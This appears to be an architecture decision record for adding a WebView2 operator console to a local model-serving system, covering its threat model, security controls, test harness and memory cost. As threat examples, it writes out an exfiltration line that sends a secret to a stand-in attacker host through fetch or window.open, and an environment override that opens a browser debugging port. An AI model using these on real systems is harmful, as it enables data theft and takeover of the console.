# ADR 0018: WebView operator console alongside the native tray

## Status

Accepted. Phase A: `cia-console.exe` is additive. `cia-tray.exe` is unchanged and
remains the supported operator panel until the console passes its own gate.

## Context

Three accepted records say this system has no web UI, and one of them says it as
a security control rather than as an observation:

- ADR 0001, Consequences: "There is no v2 web UI."
- ADR 0005, Rationale: a notification-area menu "adds no browser server,
  frontend dependency graph, CORS surface, or new port."
- `THREAT_MODEL.md`: `| Stored/browser XSS | No web UI in v2 | Listener/route inventory |`
- `ARCHITECTURE.md` defines `cia-tray.exe` as a process with "no listener,
  browser runtime, chat surface, or prompt history."

Those statements are true of the code. There is no `text/html`, no
`http.FileServer`, no `html/template`, no embedded frontend and no CORS handling
anywhere in `internal/**` or `cmd/**`.

The operator surface has nonetheless outgrown a Win32 menu. The tray renders a
fixed status line with a hard-coded adapter name, maps error codes to Portuguese
by substring-matching English error text, and duplicates its own action-gating
logic between the menu and the dashboard. Meanwhile `/api/v1/status` already
publishes per-model capacity arithmetic, GPU pressure, runtime provenance,
release identity and maintenance lifecycle that nothing displays, and
`mcpadmin.Client` already implements `drain`/`resume` that no operator surface
can reach.

The reason to reconsider is that surface, not the aesthetics. The reason to be
careful is that a browser engine is not a rendering library — it is a
script-execution environment, and this system currently has none in its operator
plane.

### What the first version of this proposal got wrong

The proposal was first argued as *no net weakening*: assets compiled into the
binary and served over a virtual host mapping so no port opens; a
`connect-src 'none'` policy so page script cannot reach the network; and the
ADR 0015 named pipe for mutations so no credential is ever held in JavaScript.

Adversarial review refuted the conclusion on two grounds, and both hold.

**The credential-free bridge is not a mitigation here.** ADR 0015 exists to
defeat an impostor that captures the transport. It was never designed to contain
a legitimate client whose own code has been subverted. A bridge wired into a DOM
means any script execution inside that DOM — stored XSS from a rendered model
name, event text or manifest field, or a compromised transitive npm package in
the shipped bundle — obtains `load`, `unload`, `switch`, `drain` and `resume`
without needing to steal anything. The absence of a credential is the absence of
a second factor.

**The ambient environment can reopen what the design closes.**
`WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS` is honoured when the WebView2
environment is created. A console launched the way `cia-tray.exe` is launched
today inherits the full user environment; `supervisor.sanitizedEnvironment()`
covers only the Router and Edge children. A process running as the serving user —
the actor `THREAT_MODEL.md` already treats as capable — can set that variable
once and turn every subsequent launch into a Chromium instance with a loopback
debugging port, which operates below CSP.

So the honest position is the opposite of the original claim: this is a net
increase in attack surface in the operator plane, and it is acceptable only if
the increase is paid for in controls that are tested rather than configured.

## Decision

Add `cia-console.exe`, a native Windows host process displaying a WebView2
control that renders a React and TypeScript operator console. It is additive.
`cia-tray.exe` keeps its ADR 0005 contract and is not replaced, and no clause of
ADR 0005 changes except the rationale's claim that no browser runtime exists in
the operator plane, which this decision knowingly retires.

Five controls are conditions of the decision, not implementation detail. Each
carries a verification, in the same sense the `THREAT_MODEL.md` table means it —
a check that fails when the control is absent.

**1. Every mutation requires a native confirmation outside the DOM.** No
`load`, `unload`, `switch`, `drain` or `resume` reaches the pipe without a Win32
dialog owned by the host process, naming the operation and its target. The page
cannot forge it, suppress it, or answer it. This is the control that replaces the
second factor the credential-free transport does not provide.
*Verification: a bridge invocation with no human approval is refused.*

**2. The host sanitizes its own environment before creating the WebView2
environment.** Every `WEBVIEW2_*` variable is removed or overridden and
`AdditionalBrowserArguments` is passed explicitly, in the spirit of what
`cia-supervisor.exe` already does for its children.
*Verification: with `--remote-debugging-port` set in the parent environment, the
console starts and no listener appears.*

**3. The runtime is pinned.** The console uses the WebView2 **Fixed Version**
distribution, identified by SHA-256, published through the ADR 0013 production
artifact store and verified by `Test-V2Installation.ps1 -VerifyHashes`. The
Evergreen runtime is rejected: it would be this project's first unpinned,
auto-updating third-party dependency, and it would put the component that
executes the console's code outside the release transaction that governs
everything else.
*Verification: the runtime hash is in the release inventory and is checked.*

**4. No HTML injection path exists, and the build proves it.**
`dangerouslySetInnerHTML` is forbidden by lint; the build asserts the shipped
bundle contains no `innerHTML` sink; the Content-Security-Policy is emitted by
the build and asserted, never hand-written into a template where it can drift.
*Verification: a data-controlled string cannot reach an HTML sink.*

**5. The npm dependency tree is covered by CI.** An SBOM and a vulnerability
scan for the JavaScript tree run beside the existing `govulncheck` and
`cyclonedx-gomod` steps, which are Go-only today. The WebView2 user-data folder
and Crashpad dump location are inventoried and given a retention policy
consistent with the metadata-only logging rule.
*Verification: a known-vulnerable npm dependency fails the build.*

The console holds no credential. It never links `internal/credential`, never
invokes `cia-credential.exe`, and is never launched through a credential
injecting wrapper. `mcpadmin.Config.TokenProvider` is supplied as a stub that
always returns an error, so the deprecated HTTP fallback fails closed instead of
reaching Windows Credential Manager. This is a real narrowing relative to
`cia-tray.exe`, which does read the administrative credential on an explicit
mutation — it is simply not sufficient on its own, which is why control 1 exists.

### Alternatives rejected

**Extend the native Win32 dashboard.** Costs continued GDI layout work in Go and
loses rich presentation and iteration speed. It preserves everything: no DOM, so
no XSS class becomes possible; no npm tree; no new runtime; full coverage by the
existing staticcheck, govulncheck, SBOM and gitleaks pipeline; no ADR needed.
This is the honest baseline against which the console must justify itself, and
it remains the fallback if the Phase A gate fails.

**A read-only CLI or TUI.** Much smaller surface, auditable line by line, renders
no markup. Loses the operator experience this decision exists to provide.

**Publish the data and build no client.** Zero cost — the status endpoint is
already public and sanitized. Solves only the observation half; every mutation
would still require the tray or the administrative MCP.

## Consequences

- The operator plane gains a script-execution environment it did not have. That
  is the cost, stated plainly, and the five controls above are what is bought
  with it.
- `THREAT_MODEL.md` loses the row whose control was "No web UI in v2". It is
  replaced by a row naming the actual risk — a DOM-rendering, script-executing
  surface now exists in the operator plane — with controls 1 and 4 as its
  mitigation and their verifications in the verification column. The row is not
  edited in place; the old control is gone and pretending otherwise would hide
  the change.
- `ARCHITECTURE.md` must record that the browser-runtime exclusion applies to
  `cia-tray.exe` specifically and no longer to the operator plane as a whole.
  That amendment is deferred: the file is currently being modified by the
  ADR 0017 work, and two authors editing it at once is how a contradiction gets
  committed.
- The WebView2 binding is `github.com/wailsapp/go-webview2` v1.0.23, MIT, pinned
  in `go.mod` and hash-pinned in `go.sum` like every other dependency. Three
  earlier drafts of this ADR preferred a hand-written COM interop layer over
  `golang.org/x/sys/windows`. That preference rested on a factual error and is
  withdrawn.

  The error was assuming a pinned Fixed Version runtime supplies its own
  `WebView2Loader.dll`, reducing loading to `LoadLibrary` plus `GetProcAddress`.
  It does not. The Fixed Version package contains the runtime binaries; the
  loader is a separate SDK component, and the Evergreen runtime installed on the
  development workstation ships no loader DLL at all. Hand-writing the binding
  would therefore mean reimplementing the loader as well as the COM activation
  path — a much larger surface than the estimate that justified it.

  The second objection, that both CGO-free bindings load an embedded
  `WebView2Loader.dll` through an in-memory PE loader, was verified against the
  module rather than its documentation, and it does not hold for the default
  build. In v1.0.23 the embedded DLL, its `go:embed` directives and the
  `go-winloader` dependency are all behind the `native_webview2loader` build
  tag. Built without that tag — the default — no native DLL enters the binary
  and no in-memory load occurs; the pure-Go `GoWebView2Loader` port is used
  instead. The build must never set that tag, and that is a reviewable one-line
  property rather than an act of faith.

  Three further properties settled the choice, each verified by building and
  running against the module rather than by reading about it.

  Its module graph adds two entries, `github.com/jchv/go-winloader` and
  `golang.org/x/sys`. The second is already a direct dependency of this project.
  The first is reachable only under the `native_webview2loader` tag, and
  `go version -m` on a default build confirms it is **not linked into the
  binary** — only `go-webview2` and `golang.org/x/sys` are. It nonetheless
  appears in `go.sum` and therefore in `govulncheck` and SBOM scope, which is
  the correct outcome: the supply chain records what could be built, and the
  binary records what was.

  It uses no cgo. A `CGO_ENABLED=0 go build -trimpath` of a probe against it
  succeeds, so the release workflow's reproducibility constraint is untouched.

  And its `webviewloader` package already implements control 2, in `init()`,
  more completely than this ADR originally specified: it neutralizes
  `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS`, `WEBVIEW2_PIPE_FOR_SCRIPT_DEBUGGER`,
  `WEBVIEW2_RELEASE_CHANNEL_PREFERENCE`, `WEBVIEW2_BROWSER_EXECUTABLE_FOLDER`
  and `WEBVIEW2_USER_DATA_FOLDER`, setting them to empty rather than unsetting
  them because the loader tests for a variable's *existence* — which also closes
  the equivalent registry override vector. This ADR's own control 2 did not
  account for the registry path; a hand-written layer would very likely have
  shipped without it.

  Control 2's verification has been executed against v1.0.23. With
  `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--remote-debugging-port=9222`,
  `WEBVIEW2_PIPE_FOR_SCRIPT_DEBUGGER=1` and
  `WEBVIEW2_RELEASE_CHANNEL_PREFERENCE=1` set in the parent environment, a probe
  process reported them as `""`, `""` and `"0"` respectively, and resolved the
  installed runtime normally. The hostile override does not survive package
  initialisation. That test belongs in the console's own suite, not in a
  scratch probe, and shipping it is part of this decision rather than evidence
  it is already satisfied.

  The residual risk is that the module's README states it "is not intended to be
  used as a standalone package". That is a real coupling to the Wails project's
  needs, and it is accepted on these terms: the version is pinned, the module is
  vendorable, its entire surface is one dependency with no transitive reach, and
  control 2's verification is an executable test rather than an assumption about
  upstream behaviour. If upstream diverges, the test fails and this decision is
  revisited on evidence.
- The console is launched at logon from the Startup folder, like the tray. It is
  not a scheduled task, is not supervised by `cia-supervisor.exe`, and is not
  inside its Job Object. That gap already exists for the tray; a multi-process
  browser engine makes it matter more, and control 2 is what stops the ambient
  environment from being the way it is exploited.
- `CGO_ENABLED=0` in the release workflow is unchanged. Any binding requiring cgo
  is out of scope by that constraint alone.
- Frontend assets are embedded with `go:embed` behind a `//go:build windows`
  constraint, matching the existing `cia-tray` split, so the Linux race-detector
  job never needs a Node toolchain to compile the module.
- The console competes for the memory the admission gate reserves for models.
  This is not a hypothetical. `TUNING.md` records that the desktop compositor
  and a browser already hold 2967-3126 MiB on this workstation before any model
  loads, ADR 0011 names a browser as one of the things "to compete for what was
  left", and `RUNBOOK.md` instructs the operator to close the browser before
  measuring because otherwise `peak_commit_gib` is not reproducible. A WebView2
  console is a second, always-on browser engine on top of that, and the machine
  it runs on already reports `insufficient_physical_memory` and refuses every
  model when ordinary desktop workload rises. Two consequences follow. The
  console must be closable without affecting the serving components, which the
  ADR 0005 tray contract already establishes and this decision inherits. And it
  must be treated exactly like the browser in the measurement discipline: closed
  before any qualification run, or the resource envelope it contaminates is the
  one the capacity gate later trusts. An operator console that quietly makes
  models unloadable would be a poor trade for a nicer status page.
- A reply that says `ok: true` is not evidence the console works, and the
  harness now says so in three places instead of one.

  The console's status read was routed through `internal/mcpserver.Status`, a
  struct that package's own MCP tools define with only the fields those tools
  read. `encoding/json` drops every key a struct does not declare, so the
  snapshot cia-edge sent was silently narrowed on the way past: 24652 bytes
  became 16645, losing `uptime_seconds`, `runtimes`, `gpu_memory`,
  `maintenance`, each model's `display_name` and `capabilities`, each model
  status's `profile`, `runtime`, `checkpoints` and `context_tokens`, and every
  physical and VRAM figure in `capacity`. The page validates what it receives
  against its own schema, that parse threw on the missing keys, and the
  operator got an error card - while the host logged a successful, correctly
  correlated reply with `ok: true` the entire time.

  The fix is that a transport carries bytes rather than re-modelling them.
  `ControlClient.StatusRaw` returns the response body verbatim, bounded and
  checked to be a JSON object, and the console reads that. `Status` is
  untouched, because for a typed tool reading two fields a narrow projection
  is exactly right; it is only wrong for a caller whose job is to hand the
  snapshot to someone else's validator. The frontend schema is built on
  `.passthrough()` precisely so new backend fields survive without a console
  release - a narrow Go struct in the middle defeats that by construction.

  Three separate assertions now stand between this and a repeat, because the
  pre-existing one could not see it: `bridge_status_round_trip` checks
  `service`, `version`, `ready` and the model count, and every one of those
  survived the loss. `bridge_status_arrives_intact` compares the key sets that
  reached the page against what the page's schema requires.
  `page_renders_the_status_it_received` samples the settled document and fails
  on any `role="alert"` or `aria-busy` region. Reintroducing the defect on
  purpose fails the second and third and still passes the first - which is the
  measurement, not the argument, that the older assertion was blind.

- Arrival and rendering are different claims, and the load self-check can only
  make the first. It is sampled when the bridge reply lands, which is strictly
  before React can have rendered anything from it, so its `textLength` always
  describes the loading state. Reading it as evidence the console displays data
  is the same category error as reading a page's own self-report as evidence it
  is composited. A second, delayed `render self-check:` report exists for the
  other claim, and the two are deliberately separate markers.

- `go test` caches a passing result and replays it, log output included,
  whenever it believes the inputs are unchanged - and it cannot see this
  harness's inputs, which include a live WebView2 runtime, an interactive
  desktop session, and a built bundle that a child process reads. Three
  consecutive attempts to prove a new assertion had teeth reported PASS from
  cache without opening a window, which reads exactly like "the assertion is
  useless" when the truth is "the test never ran". Any run meant to learn
  something must pass `-count=1`; the harness's doc comment now says so.

- **Decision: the console speaks only on semantic transitions, from one
  region that is never unmounted.**

  The status query polls every five seconds. Announcing what it returns would
  speak roughly 720 times an hour, which is not merely useless but actively
  destructive - it buries whatever the operator was reading. So the console
  announces readiness changes, maintenance changes, and the transition into
  and out of "not answering", and nothing else. Never a poll. Never the gate
  counters, the queue depth, or the request log: those change constantly and
  mean nothing as isolated spoken numbers.

  The region is mounted for the whole session and only its text changes.
  Assistive technology announces mutations *within* a region that already
  exists; a region inserted into the DOM already carrying its message is
  frequently never announced at all. The stale-data warning originally had
  `role="status"` and mounted with the condition it described - markup that
  reads correctly and would have been silent in practice. It is now visual
  only, and speech comes from the persistent region.

- **Decision: Sprint 5's inference transport is a third transport, and two
  invariants are contract terms rather than implementation notes.**

  The administrative pipe is discarded as a candidate, on a technical ground
  rather than a preference: it is request/response with no stream and no
  abort, and the sprint's own gate requires that cancel works.

  **Invariant 1 - credentialless renderer.** A credential must never reach the
  renderer. Note the precision: the *renderer* is what may not hold one, not
  the console as a whole. The host process may hold an inference credential;
  the page must never see it, never receive it in a message, and never be able
  to cause it to be echoed back. This is the invariant the five controls in
  this ADR exist to protect, and it is what keeps the security argument small
  enough to hold in one file - a compromised page inherits the host's
  *authority to ask*, never its credential.

  **Invariant 2 - cancellation is a contract term.** Any transport that
  carries inference must support real cancellation, expressed to the page as
  an `AbortSignal` or an equivalent the page already knows how to use. Not
  best-effort, not "the request eventually times out": an abort must actually
  release the admission gate. This is written as a contract requirement rather
  than a feature because the failure mode is silent - a cancel button that
  resolves its promise while the model keeps generating looks identical to one
  that works, and the operator only discovers the difference when the gate
  stays busy.

  Both invariants are testable from outside, and must be tested that way: that
  no credential-shaped value ever crosses to the page, and that an aborted
  request is observably released rather than merely abandoned.

- **The console cannot write configuration either, and the proof is one
  struct.** The wire between the page and the host is `Operation` in
  `cmd/cia-console/bridge.go`:

  ```go
  type Operation struct {
      Kind    string `json:"kind"`
      ModelID string `json:"model_id,omitempty"`
  }
  ```

  A kind and a target. There is no field for a *value*, so there is no shape
  in which "set `max_active` to 4" could cross, whatever the backend might be
  willing to accept. Every configuration figure the status payload
  reports - `gate.max_active`, `gate.max_queue`, `gate.wait_timeout_seconds`,
  the three `reserve_*_gib` budgets, each model's profile and context window,
  everything in `config/models.yaml`, every `CIA_*` environment variable - is
  display-only from this console's side, and startup-time on the provider's.

  This is worth stating as a positive design property rather than a gap. The
  allowlist in `bridge.go` classifies by kind and refuses anything not in it;
  a mutation that carried an arbitrary value would need that allowlist to
  reason about the value too, which is a materially harder thing to get right
  than deciding whether a string is one of five known verbs. The narrow wire
  is why the bridge's security argument stays small enough to hold in one
  file.

  The consequence for the operator console's shape is direct: there is no
  Settings screen, and adding one would mean a read-only list of values
  nobody can change under a label that promises otherwise. Configuration on
  this machine is edited where it lives - `config/models.yaml` and the
  environment - and read back through the console, not through it.

- **Sprint 5 is closed: this console does not perform inference, by design.**
  The sprint's result is an architectural decision, not a hidden backlog item:
  the current console surface remains credentialless and exposes no inference
  UI until a separate transport decision is made.

  Three facts settle it, each checked against the code rather than recalled:
  the administrative pipe accepts exactly five operations - `load`, `unload`,
  `switch`, `maintenance.drain`, `maintenance.resume` (`internal/adminpipe`'s
  protocol constants) - and none of them is an inference call; the data plane
  answers an unauthenticated inference request with 401 `invalid_api_key` via
  `writeInferenceAuthError` (`internal/edge/server.go`); and the console holds
  no credential at all, which is not an oversight but the premise this whole
  ADR is built on - the DACL-protected pipe of ADR 0015 carries authorization
  by who may open it, never by what the caller presents.

  So a prompt composer, a streaming response, and a cancel control are outside
  the current surface rather than partially implemented. Adding them would be a
  new architecture change with materially different security consequences:

  1. Give the console an inference credential. This is the smallest code
     change and the largest change to this ADR - it would put a credential
     inside the WebView2 host, which is the one thing the current design
     spends all five of its controls avoiding.
  2. Add an inference path to the administrative pipe. Keeps the console
     credential-free, but widens a channel deliberately scoped to mutations,
     and streaming over that transport is not a small addition.
  3. Introduce a third transport with its own boundary.

  Until one is chosen in a future scope, the honest state is that there is no
  inference screen in this console. That absence is the Sprint 5 closure state,
  not an implementation gap inside the existing bridge.

- The Phase A spike was built and run, and it corrects this record twice.

  **Control 2 now has an executing verification.** `cmd/cia-console` carries an
  opt-in end-to-end harness (`CIA_CONSOLE_E2E=1`) that launches the real window
  with `WEBVIEW2_ADDITIONAL_BROWSER_ARGUMENTS=--remote-debugging-port=<n>` and
  `WEBVIEW2_PIPE_FOR_SCRIPT_DEBUGGER=1` in the parent environment, then asserts
  that no listener appears on that port and that the console process owns no
  listening socket at all, read from `GetExtendedTcpTable` rather than by
  shelling out. Control 2 and the "no port opens" property are therefore
  checked against a live WebView2 environment on every run, not argued.

  **The harness is opt-in, so CI does not run it.** It needs an interactive
  desktop session and a built frontend. That is a real gap, not a detail: the
  class of defect it exists to catch is exactly the class no CI job here will
  ever see. Sprint 9 extends it with settled layout-geometry checks and a
  Win32 bitmap summary of the visible WebView2 content. That proves the default
  window is not blank or monochrome, but it is still not a golden-screenshot or
  pixel-perfect visual-design gate.

- Containing navigation was only half the egress problem, and the other half
  was found by an adversarial security review rather than by reasoning.

  `NavigationStarting` governs where *this* window may go. It does not fire
  for `window.open` or for a link with `target=_blank`: those raise
  `NewWindowRequested`, a separate event. So a page that could not navigate
  away could still open a second window pointed anywhere.

  The Content-Security-Policy does not close it either, and the reason is
  worth stating because `connect-src 'none'` reads as though it should. CSP
  governs what a document may fetch, embed and execute. Opening a window is
  none of those. A compromised page cannot
  `fetch("https://attacker.test?x=" + secret)`, but it can `window.open` the
  same URL, and the data leaves in the request line just the same.

  The refusal is unconditional - not an allowlist like the navigation guard's.
  This console is a single operator surface with no external links and no
  second window of its own, so there is nothing to permit. It is registered
  from the same install path as the navigation guard, deliberately: installing
  one without the other would leave an egress channel open while the log
  reported a guard installed, which is precisely the false confidence the
  inert `WebResourceRequested` filter used to provide.

  The harness probes both channels from the page and requires both counters to
  have moved. Adding the `window.open` probe immediately broke an unrelated
  assertion, which turned out to be informative rather than annoying: a
  *refused* new-window request still leaves a hidden child window behind, and
  `regression_controller_visibility` had been requiring every child window to
  be visible. Isolating it - disabling only the new probe, changing nothing
  else - confirmed the console was compositing correctly the whole time. The
  assertion now requires at least one visible child rather than all of them,
  which gives up nothing: leaving `IsVisible` false hides the controller's
  entire tree, so the defect it guards is *every* child invisible, never some.
  Removing `chromium.Show()` still fails it, with "none of the host window's 3
  child window(s) is visible".

- Navigation containment now exists, and the way it was got wrong first is
  the more useful half of this entry.

  The original attempt registered `AddWebResourceRequestedFilter("*",
  ...CONTEXT_ALL)` and refused any request whose host was not the virtual
  host, standing in for the `NavigationStarting` cancellation the binding does
  not wrap. Running it showed the callback never fires at all - not for the
  document, not for a subresource - because WebView2 resolves virtual-host
  resources below the layer `WebResourceRequested` observes. It was code that
  read exactly like a control and enforced nothing, and it sat in the tree
  being counted as one.

  The real control is a `NavigationStarting` handler, and reaching it took
  writing both the `ICoreWebView2NavigationStartingEventHandler` COM object
  and the `ICoreWebView2NavigationStartingEventArgs` wrapper, neither of which
  `github.com/wailsapp/go-webview2` ships. Both mirror the binding's own
  internal pattern and are built from its exported `edge.NewComProc`. One
  genuinely unsafe step remains: `AddNavigationStarting` is reached by
  indexing `ICoreWebView2`'s vtable directly, because the binding declares
  that vtable struct unexported. The slot index is fixed by the WebView2 IDL,
  which is a frozen append-only ABI, and the registration call's `HRESULT` is
  checked rather than discarded - a guard that failed to register would
  otherwise look identical to one that registered and was never needed.

  The policy is split out of the COM plumbing into a portable file for the
  same reason `bridge.go` is portable: the security-relevant decision belongs
  in the `ubuntu-latest` race job, not only in a harness that needs a Windows
  desktop session to run at all. Its tests are written as an attacker would
  write them - `evil-cia-console.invalid`, `cia-console.invalid.attacker.test`,
  `https://cia-console.invalid@attacker.test/` - because whole-string,
  case-insensitive host equality is the only comparison a crafted hostname
  cannot widen.

  **The guard is demonstrated by making it refuse something, never by
  observing that it is registered.** The end-to-end harness has the page
  assign `window.location` to an off-host target and then post a marker, and
  requires two independent signals to agree: the page is still alive to send
  that marker, and the guard's own counter recorded the refusal. Making the
  policy permit everything makes that check fail by timeout - the page really
  does leave, and never posts - while the log still reads `navigation guard
  installed`. That failure mode is the entire reason the assertion is shaped
  this way.

  One boundary, named rather than hidden: the console's own first navigation
  is not guarded. The binding exposes a raw `*ICoreWebView2` only as a
  callback's sender, so the earliest possible install point is the first
  completed navigation. The one unguarded navigation is a hardcoded constant
  in `main_windows.go`, not anything the page can influence.

  The inert `WebResourceRequested` filter is kept as an independent second
  layer for requests that do reach it, with its doc comment rewritten to say
  plainly that it is not the navigation control. No control in this ADR
  depends on it, and this host has still never observed it firing for
  anything - so its value for off-host requests remains argued, not
  measured.

- A page cannot observe whether it is being composited, and that shaped the
  harness. The spike's window rendered nothing while an in-page self-check
  reported a fully correct document: `readyState: complete`, a 1264x821
  viewport, the dark-theme canvas token resolved, React mounted, text present.
  The cause was `ICoreWebView2Controller::IsVisible` left false by `Embed`, so
  the controller's child windows existed at the right size and composited
  nothing. Every candidate cause was isolated by removing it and re-running:
  the host name, the asset tags' `crossorigin` attribute, and an explicit
  controller resize were each measured and found irrelevant. Only the
  visibility call mattered. The harness therefore asserts on child-window
  visibility through `EnumChildWindows`/`IsWindowVisible`, because that is the
  one property the page's own report cannot contain.

- The console's measured footprint is roughly 305 MB - about 65 MB for
  `cia-console.exe` and about 240 MB across the six WebView2 processes it
  spawns. Against the 2967-3126 MiB `TUNING.md` already records for the
  compositor and a browser, that is on the order of a tenth more. It was not
  what blocked a load during the spike - the machine was several GiB short on
  its own - but it is not noise either, and it is now a number rather than an
  assertion.

- Phase B is unspecified on purpose. Whether the console eventually absorbs the
  tray is a separate decision that requires evidence this one cannot supply.
